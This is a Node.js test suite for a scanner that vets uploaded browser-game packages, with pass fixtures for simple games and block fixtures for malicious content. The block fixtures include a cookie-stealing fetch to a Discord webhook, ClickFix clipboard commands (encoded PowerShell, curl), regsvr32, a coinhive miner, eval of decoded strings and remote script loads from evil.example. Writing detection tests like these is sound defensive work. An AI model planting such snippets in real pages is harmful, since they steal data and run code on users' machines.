// Run: node --test tests/
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { readFileSync } from 'node:fs';
const { scan, scanAsync, scanInWorker, usesWorker, WORKER_BYTES, LIMITS } = createRequire(import.meta.url)('../lab/scan.js');

const enc = s => new TextEncoder().encode(s);
const pkg = obj => new Map(Object.entries(obj).map(([k, v]) => [k, typeof v === 'string' ? enc(v) : v]));
const ids = r => r.findings.map(f => f.id);

const CANVAS_GAME = `<!doctype html><canvas id=c width=320 height=240></canvas><script>
const ctx=document.getElementById('c').getContext('2d');let score=0,lives=3,player={x:10};
addEventListener('keydown',e=>{if(e.key==='ArrowRight')player.x+=4});
function update(dt){score++}function frame(){ctx.fillRect(player.x,10,8,8);requestAnimationFrame(frame)}frame();
</script>`;
const DOM_GAME = `<!doctype html><button id=b>Click</button><p>Score: <span id=s>0</span> Level 1 Lives 3</p><script>
let score=0;document.getElementById('b').onclick=()=>{score++;s.textContent=score};setInterval(()=>{score+=1},1000);
const player={health:3};</script>`;

test('plain canvas game passes', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME }));
  assert.equal(r.verdict, 'pass', JSON.stringify(r.findings));
  assert.ok(r.looksLikeGame);
});

test('DOM clicker game passes', () => {
  const r = scan(pkg({ 'index.html': DOM_GAME }));
  assert.equal(r.verdict, 'pass', JSON.stringify(r.findings));
});

test('game with assets and cdn library passes', () => {
  const html = `<script src="https://cdnjs.cloudflare.com/ajax/libs/phaser/3.60.0/phaser.min.js"></script><script src="game.js"></script>`;
  const r = scan(pkg({ 'index.html': html, 'game.js': 'new Phaser.Game({});addEventListener("keydown",()=>{});let score=0,level=1;',
    'hero.png': new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 0]) }));
  assert.equal(r.verdict, 'pass', JSON.stringify(r.findings));
});

test('crypto miner is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME + '<script src="https://coinhive.com/lib/coinhive.min.js"></script>' }));
  assert.equal(r.verdict, 'block');
  assert.ok(ids(r).includes('miner'));
});

test('discord webhook exfil is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'a.js': 'fetch("https://discord.com/api/webhooks/123/abc",{method:"POST",body:document.cookie})' }));
  assert.equal(r.verdict, 'block');
});

test('ClickFix clipboard command is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME + `<script>navigator.clipboard.writeText("powershell -w hidden -enc AAAA")</script>` }));
  assert.equal(r.verdict, 'block');
  assert.ok(ids(r).includes('shell-command') || ids(r).includes('clipboard-command'));
});

test('executable file is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'setup.exe': new Uint8Array([0x4d, 0x5a, 0, 0]) }));
  assert.equal(r.verdict, 'block');
});

test('png that is really a program is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'hero.png': new Uint8Array([0x4d, 0x5a, 0x90, 0]) }));
  assert.equal(r.verdict, 'block');
  assert.ok(ids(r).includes('disguised'));
});

test('png that is really a script is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'logo.png': enc('<script>alert(1)</script>') }));
  assert.ok(ids(r).includes('disguised'));
});

test('path traversal is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, '../evil.js': 'x' }));
  assert.equal(r.verdict, 'block');
});

test('eval of decoded string needs review at least', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'x.js': 'eval(atob("YWxlcnQoMSk="))' }));
  assert.notEqual(r.verdict, 'pass');
  assert.ok(ids(r).includes('eval-decode'));
});

test('login form page is not a pass', () => {
  const r = scan(pkg({ 'index.html': '<form><input type="password" name="p"><button>Sign in to continue</button></form>' }));
  assert.notEqual(r.verdict, 'pass');
  assert.ok(!r.looksLikeGame);
});

test('redirect and top navigation are flagged', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME + `<script>top.location = "https://evil.example"; location.href = "https://evil.example/x"</script>` }));
  assert.ok(ids(r).includes('top-nav') && ids(r).includes('redirect'));
  assert.notEqual(r.verdict, 'pass');
});

test('script from unknown host is flagged', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME + `<script>var s=document.createElement("script");s.src="https://evil.example/p.js";document.head.appendChild(s)</script>` }));
  assert.ok(ids(r).includes('remote-code'));
});

test('repo without html says it needs a build', () => {
  const r = scan(pkg({ 'package.json': '{"scripts":{"build":"vite build"}}', 'src/main.js': 'x' }));
  assert.equal(r.verdict, 'reject');
  assert.match(r.notAGame, /build/);
});

test('empty package is rejected', () => {
  assert.equal(scan(new Map()).verdict, 'reject');
});

test('obfuscated code is flagged medium', () => {
  const junk = Array.from({ length: 60 }, (_, i) => `_0x${(0x1a2b + i).toString(16)}()`).join(';');
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'o.js': junk }));
  assert.ok(ids(r).includes('obfuscated'));
});

test('entry picks the shallowest index.html', () => {
  const r = scan(pkg({ 'a/b/index.html': CANVAS_GAME, 'index.html': CANVAS_GAME }));
  assert.equal(r.entry, 'index.html');
});

// ---- one fixture per rule id -------------------------------------------------
// Each row is [rule id, package]. The package must make scan.js raise that id.
// Text rules get a snippet appended to a working canvas game; markup rules are
// in index.html because they only run on html/svg files.
const withSnippet = snippet => pkg({ 'index.html': CANVAS_GAME + snippet });
const fake = length => ({ length }); // stands in for a big file without allocating it
const MB = 1024 * 1024;

const RULE_FIXTURES = [
  // size and path
  ['too-many-files', new Map(Array.from({ length: LIMITS.files + 1 }, (_, i) => [`f${i}.txt`, enc('x')]))],
  ['too-big', pkg({ 'a.bin': fake(80 * MB), 'b.bin': fake(80 * MB), 'c.bin': fake(80 * MB), 'd.bin': fake(80 * MB) })],
  ['file-too-big', pkg({ 'index.html': CANVAS_GAME, 'big.bin': fake(LIMITS.fileBytes + 1) })],
  ['bad-path', pkg({ 'index.html': CANVAS_GAME, '../evil.js': 'x' })],
  // file types
  ['program-file', pkg({ 'index.html': CANVAS_GAME, 'tool.exe': 'x' })],
  ['review-file', pkg({ 'index.html': CANVAS_GAME, 'server.php': '<?php echo 1;' })],
  ['disguised', pkg({ 'index.html': CANVAS_GAME, 'hero.png': new Uint8Array([0x4d, 0x5a, 0x90, 0]) })],
  ['unknown-types', pkg({ 'index.html': CANVAS_GAME, 'notes.xyz1': 'x' })],
  // text rules
  ['miner', withSnippet('<script>var pool = "stratum+tcp://pool.example:3333";</script>')],
  ['webhook-exfil', withSnippet('<script>fetch("https://api.telegram.org/bot1/sendMessage");</script>')],
  ['shell-command', withSnippet('<script>var c = "regsvr32 /s evil.dll";</script>')],
  ['clipboard-command', withSnippet('<script>navigator.clipboard.writeText("curl http://x/y");</script>')],
  ['extension-install', withSnippet('<script>chrome.webstore.install();</script>')],
  ['eval-decode', withSnippet('<script>eval(atob("YWxlcnQoMSk="));</script>')],
  ['doc-write-unescape', withSnippet('<script>document.write(unescape("%3Cp%3E"));</script>')],
  ['packed-eval', withSnippet('<script>eval(function(p,a,c,k,e,d){return p});</script>')],
  ['obfuscated', withSnippet('<script>' + Array.from({ length: 60 }, (_, i) => `_0x${(0x1a2b + i).toString(16)}()`).join(';') + '</script>')],
  ['redirect', withSnippet('<script>location.href = "https://evil.example/x";</script>')],
  ['meta-refresh', withSnippet('<meta http-equiv="refresh" content="0;url=https://evil.example">')],
  ['top-nav', withSnippet('<script>parent.location = "https://evil.example";</script>')],
  ['top-access', withSnippet('<script>window.parent.document.title = "x";</script>')],
  ['password-field', withSnippet('<input type="password" name="p">')],
  ['phish-text', withSnippet('<p>Enter your password to continue.</p>')],
  ['scare-text', withSnippet('<p>Your computer has been infected.</p>')],
  ['download-exe', withSnippet('<script>var url = "setup.exe";</script>')],
  ['clipboard-read', withSnippet('<script>navigator.clipboard.readText();</script>')],
  ['cookie-read', withSnippet('<script>var c = document.cookie;</script>')],
  ['beacon', withSnippet('<script>navigator.sendBeacon("/log", "x");</script>')],
  ['websocket', withSnippet('<script>new WebSocket("wss://example.com/ws");</script>')],
  ['hidden-iframe', withSnippet('<iframe src="about:blank" width="0" height="0"></iframe>')],
  ['hidden-iframe-js', withSnippet("<script>var f = document.createElement('iframe'); f.style.display='none';</script>")],
  ['external-iframe', withSnippet('<iframe src="https://example.org/page"></iframe>')],
  ['meta-csp-strip', withSnippet('<meta http-equiv="Content-Security-Policy" content="default-src *">')],
  ['device-access', withSnippet('<script>navigator.geolocation.getCurrentPosition(() => {});</script>')],
  ['service-worker', withSnippet('<script>navigator.serviceWorker.register("/sw.js");</script>')],
  ['remote-code', withSnippet('<script>importScripts("https://evil.example/x.js");</script>')],
  ['tab-trap', withSnippet('<script>window.onbeforeunload = () => "stay";</script>')],
  ['popup', withSnippet('<script>window.open("https://example.org");</script>')],
  ['fingerprint', withSnippet('<script>navigator.getBattery();</script>')],
  ['download-trigger', withSnippet('<script>var a = document.createElement("a"); a.download = "x.txt";</script>')],
  // host check
  ['external-hosts', pkg({ 'index.html': CANVAS_GAME + '<img src="https://tracker.example.net/p.gif">' })],
];

for (const [id, files] of RULE_FIXTURES) {
  test(`rule ${id} fires on its fixture`, () => {
    const r = scan(files);
    assert.ok(ids(r).includes(id), `expected ${id}, got ${JSON.stringify(ids(r))}`);
  });
}

test('every rule id in scan.js has a fixture', () => {
  const src = readFileSync(new URL('../lab/scan.js', import.meta.url), 'utf8');
  const declared = new Set([...src.matchAll(/\{ id: '([a-z-]+)'/g), ...src.matchAll(/add\('([a-z-]+)'/g)].map(m => m[1]));
  const covered = new Set(RULE_FIXTURES.map(([id]) => id));
  assert.deepEqual([...declared].filter(id => !covered.has(id)), []);
  assert.deepEqual([...covered].filter(id => !declared.has(id)), []);
});

// ---- negative cases: near-misses that must not raise a finding at each tier ----
const NEAR_MISS = {
  critical: '<script>// Built with PowerShell scripts and the cmd prompt. No shell runs here.</script>',
  high: '<script>const loc = window.location.search; // a high-score table, not a redirect</script>',
  medium: '<script>const docCookie = 1; const parentNode = 2; // top scores</script>',
  low: '<script>const memory = 1; const menu = 2;</script>',
};

for (const [tier, snippet] of Object.entries(NEAR_MISS)) {
  test(`no ${tier} finding for a near-miss`, () => {
    const r = scan(withSnippet(snippet));
    assert.deepEqual(r.findings.filter(f => f.sev === tier), [], JSON.stringify(r.findings));
  });
}

test('clean game raises no findings', () => {
  assert.deepEqual(scan(pkg({ 'index.html': CANVAS_GAME })).findings, []);
});

// ---- worker path: big packages go to a worker, with the same result ----------
test('large package goes to the worker and gives the same result as the inline scan', async () => {
  // Two text files of about half the threshold each, so the total is over WORKER_BYTES.
  const filler = 'var pad = 1;\n'.repeat(Math.ceil(WORKER_BYTES / 2 / 13) + 1);
  const big = pkg({ 'index.html': CANVAS_GAME, 'a.js': filler, 'b.js': filler, 'x.js': 'eval(atob("YWxlcnQoMSk="))' });
  assert.ok(usesWorker(big), 'expected the worker path');
  const inline = scan(big);
  assert.ok(ids(inline).includes('eval-decode'));
  assert.deepEqual(await scanInWorker(big), inline);
  assert.deepEqual(await scanAsync(big), inline);
});

test('small package gives the same result on both paths', async () => {
  const small = pkg({ 'index.html': CANVAS_GAME, 'x.js': 'eval(atob("YWxlcnQoMSk="))' });
  assert.equal(usesWorker(small), false);
  const inline = scan(small);
  assert.deepEqual(await scanAsync(small), inline);
  assert.deepEqual(await scanInWorker(small), inline);
});
